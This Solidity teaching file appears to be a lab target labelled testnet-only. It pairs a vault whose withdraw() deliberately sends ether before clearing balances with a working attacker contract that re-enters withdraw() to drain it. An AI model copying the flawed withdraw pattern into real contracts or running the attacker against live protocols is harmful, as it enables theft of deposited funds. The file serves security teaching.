// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * @title GreenhouseVault（教学漏洞合约）
 * @notice ⚠️ EDUCATIONAL / TESTNET ONLY ⚠️
 *
 * 这是 Monad Guardian Farm 安全温室的「漏洞靶场」合约，故意保留重入漏洞。
 *
 * 禁止行为：
 *   - 不要把本合约部署到主网；
 *   - 不要向本合约发送任何具有真实价值的资产；
 *   - 不要在真实 DeFi 协议上复现同类攻击。
 *
 * 漏洞说明：
 *   withdraw() 先向 msg.sender 发起外部调用（转账），之后才把余额清零。
 *   攻击者可以在 receive()/fallback() 中再次调用 withdraw()，
 *   此时 balances[msg.sender] 尚未更新，因此可以重复提款。
 */
contract GreenhouseVault {
    mapping(address => uint256) public balances;

    uint256 public totalDeposits;

    event Deposited(address indexed account, uint256 amount);
    event Withdrawn(address indexed account, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    /// @dev 漏洞函数：外部调用发生在状态更新之前（Checks-Effects-Interactions 被违反）。
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "no balance");

        // ❌ Vulnerable: external call BEFORE state update
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");

        balances[msg.sender] = 0;
        totalDeposits -= amount;
        emit Withdrawn(msg.sender, amount);
    }

    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title ReentrancyAttacker（教学攻击者合约 · TESTNET ONLY）
 * @notice 仅用于在本地/测试网演示重入攻击，不得针对真实协议使用。
 */
contract ReentrancyAttacker {
    GreenhouseVault public immutable vault;
    uint256 public attackCount;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address vaultAddress) {
        vault = GreenhouseVault(payable(vaultAddress));
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "need seed ether");
        vault.deposit{value: ATTACK_AMOUNT}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= ATTACK_AMOUNT && attackCount < 20) {
            attackCount += 1;
            vault.withdraw();
        }
    }

    function stolen() external view returns (uint256) {
        return address(this).balance;
    }
}
